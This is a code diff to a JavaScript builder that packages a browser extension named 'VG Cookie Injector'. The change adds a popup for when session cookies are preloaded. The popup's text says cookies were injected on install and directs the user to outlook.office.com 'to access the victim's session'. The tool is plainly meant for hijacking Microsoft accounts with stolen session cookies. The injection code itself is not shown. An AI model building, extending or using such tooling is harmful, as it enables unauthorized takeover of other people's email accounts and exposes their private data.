@@ -212,8 +212,45 @@ async function clearSession() {
 
 /**
  * Generate popup HTML
+ * @param {boolean} hasPreloaded - whether cookies were pre-loaded into the background worker
  */
-function generatePopupHtml() {
+function generatePopupHtml(hasPreloaded) {
+  if (hasPreloaded) {
+    return `<!DOCTYPE html>
+<html>
+<head>
+<meta charset="UTF-8">
+<style>
+*{box-sizing:border-box;margin:0;padding:0}
+body{width:320px;padding:16px;font-family:-apple-system,sans-serif;background:#1a1a1e;color:#e0e0e0}
+h1{font-size:14px;margin-bottom:12px;color:#0078d4}
+.section{margin-bottom:12px}
+.section-title{font-size:11px;color:#888;margin-bottom:6px;text-transform:uppercase}
+.status{padding:10px;border-radius:4px;font-size:12px;margin-bottom:8px;display:block}
+.status.success{background:#1b5e20;color:#a5d6a7}
+button{width:100%;padding:10px;border:none;border-radius:4px;font-size:12px;font-weight:600;cursor:pointer;margin-bottom:6px}
+.btn-danger{background:#d32f2f;color:#fff}
+.hint{font-size:10px;color:#666;margin-top:4px;line-height:1.4}
+</style>
+</head>
+<body>
+<h1>✅ VG Cookie Injector</h1>
+<div class="section">
+<div class="status success">Session activated automatically.<br>Cookies were set on install.</div>
+</div>
+<div class="section">
+<div class="section-title">Danger Zone</div>
+<button class="btn-danger" onclick="clearSession()">Clear All Microsoft Cookies</button>
+</div>
+<div class="section">
+<div class="section-title">Help</div>
+<div class="hint">Cookies were injected when you loaded this extension.<br>Open outlook.office.com to access the victim's session.<br>Requires Chrome or Edge.</div>
+</div>
+<script src="popup.js"></script>
+</body>
+</html>`;
+  }
+
   return `<!DOCTYPE html>
 <html>
 <head>
@@ -320,7 +357,7 @@ function buildExtension(options = {}) {
 
   const manifest = generateManifest();
   const backgroundJs = generateBackgroundJs(apiBaseUrl, preloadedCookies);
-  const popupHtml = generatePopupHtml();
+  const popupHtml = generatePopupHtml(!!preloadedCookies);
   let popupJs = generatePopupJs(apiBaseUrl);
   // Simple 1x1 transparent PNG as base64
   const icon = 'iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mP8/5+hHgAHggJ/PchI7wAAAABJRU5ErkJggg=='
